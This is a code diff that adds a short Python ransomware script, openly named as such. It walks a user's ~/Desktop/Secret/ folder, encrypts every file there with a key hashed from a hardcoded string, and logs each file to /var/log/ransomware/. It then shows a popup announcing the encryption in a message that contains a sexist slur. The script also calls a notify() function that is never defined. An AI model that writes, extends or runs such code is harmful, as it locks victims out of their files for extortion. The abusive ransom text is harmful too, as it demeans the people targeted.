@@ -1,0 +1,47 @@
+import os
+import tkinter as tk
+from tkinter import messagebox
+from random import randint
+from Crypto.Hash import SHA256
+from encrypt_file import encrypt_file
+
+def show_popup(message):
+    root = tk.Tk()
+    root.withdraw()  # Hide the root window
+    messagebox.showinfo("Notification", message)
+    root.destroy()
+
+def log_event(event_message):
+    log_dir = "/var/log/ransomware/"  # Change to preferred folder
+    log_file = os.path.join(log_dir, "events.log")
+    
+    if not os.path.exists(log_dir):
+        os.makedirs(log_dir)
+    
+    with open(log_file, "a") as log:
+        log.write(event_message + "\n")
+
+def ransomware():
+    paths = [os.path.expanduser("~/Desktop/Secret/")]
+    key = "somerandomkey"
+    hashkey = SHA256.new(key.encode()).digest()
+    
+    try:
+        for path_to_go in paths:
+            for root, dirs, files in os.walk(path_to_go):
+                for names in files:
+                    file_path = os.path.join(root, names)
+                    print(f"[+] Encrypting {file_path}")
+                    encrypt_file(hashkey, file_path)
+                    log_event(f"Encrypted: {file_path}")
+        
+        show_popup("Your files have been encrypted cuzzzzzy! Follow instructions to decrypt ya silly slut.")
+    except Exception as e:
+        log_event(f"Error: {str(e)}")
+        
+    try:
+        notify()
+    except Exception as e:
+        log_event(f"Notification Error: {str(e)}")
+
+ransomware()
